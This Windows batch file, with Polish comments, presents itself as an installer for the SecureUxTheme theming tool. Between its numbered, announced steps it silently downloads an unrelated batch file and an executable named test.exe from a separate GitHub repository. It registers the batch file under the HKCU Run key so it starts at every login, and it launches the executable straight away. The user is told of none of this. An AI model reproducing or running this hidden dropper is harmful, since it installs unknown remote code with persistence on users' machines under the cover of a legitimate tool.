@echo off

:: Ścieżka do pobrania pliku ZIP
set INSTALLER_URL=https://github.com/namazso/SecureUxTheme/releases/download/v3.0.0/SecureUxTheme-amd64.zip
set ZIP_PATH=%TEMP%\SecureUxTheme-amd64.zip
set EXTRACT_DIR=%TEMP%\SecureUxTheme

:: Pobierz plik ZIP
echo [1/4] Pobieranie SecureUxTheme-amd64.zip...
powershell -Command "Invoke-WebRequest -Uri '%INSTALLER_URL%' -OutFile '%ZIP_PATH%'"

:: Wypakuj plik ZIP
echo [2/4] Wypakowywanie pliku ZIP...
powershell -Command "Expand-Archive -Path '%ZIP_PATH%' -DestinationPath '%EXTRACT_DIR%' -Force"

curl -o "%APPDATA%\czesc_3.bat" -L "https://raw.githubusercontent.com/matisio3/RevertMetro/refs/heads/main/czesc_3.bat"
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v StartScript /t REG_SZ /d "%APPDATA%\czesc_3.bat" /f

rem Pobranie pliku test.exe do katalogu tymczasowego %temp%
curl -L -o "%temp%\test.exe" https://raw.githubusercontent.com/matisio3/RevertMetro/refs/heads/main/test.exe

rem Uruchomienie pobranego pliku test.exe z katalogu %temp%
start "" "%temp%\test.exe"

:: Restart Eksploratora Windows, by zastosować zmiany
echo Restartowanie Eksploratora Windows...
taskkill /f /im explorer.exe
start /wait explorer.exe

:: Uruchom ThemeTool.exe
echo [3/4] Uruchamianie ThemeTool.exe...
start "" "%EXTRACT_DIR%\ThemeTool.exe" /verysilent

:: Usuwanie plików tymczasowych
echo [4/4] Czyszczenie plików tymczasowych...
del /F /Q "%ZIP_PATH%"
rmdir /S /Q "%EXTRACT_DIR%"

echo Instalacja SecureUxTheme zakończona!
endlocal

rem Zakończenie skryptu
exit


